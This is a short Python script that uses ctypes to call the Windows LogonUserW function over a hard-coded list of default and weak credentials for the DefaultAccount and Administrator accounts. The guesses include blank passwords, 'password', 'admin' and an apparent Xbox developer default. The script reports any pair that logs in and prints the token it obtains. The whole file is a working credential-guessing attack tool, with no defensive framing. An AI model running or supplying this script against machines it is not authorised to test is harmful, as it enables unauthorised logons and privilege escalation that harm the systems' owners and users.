import ctypes
from ctypes import wintypes

advapi32 = ctypes.windll.advapi32
kernel32 = ctypes.windll.kernel32

LOGON32_LOGON_INTERACTIVE = 2
LOGON32_PROVIDER_DEFAULT = 0

advapi32.LogonUserW.restype = wintypes.BOOL

candidates = [
    ("DefaultAccount", ""),
    ("DefaultAccount", None),
    ("Administrator", ""),
    ("Administrator", None),
    ("Administrator", "XboxDev123!"),
    ("Administrator", "password"),
    ("Administrator", "admin"),
]

for user, pwd in candidates:
    hToken = wintypes.HANDLE()
    res = advapi32.LogonUserW(
        user,
        None,
        pwd,
        LOGON32_LOGON_INTERACTIVE,
        LOGON32_PROVIDER_DEFAULT,
        ctypes.byref(hToken)
    )
    if res:
        print(f"Logon SUCCESS for {user} with pwd '{pwd}'! Token: {hToken.value}")
        kernel32.CloseHandle(hToken)
    else:
        err = kernel32.GetLastError()
        print(f"Logon FAILED for {user} with pwd '{pwd}': err={err}")
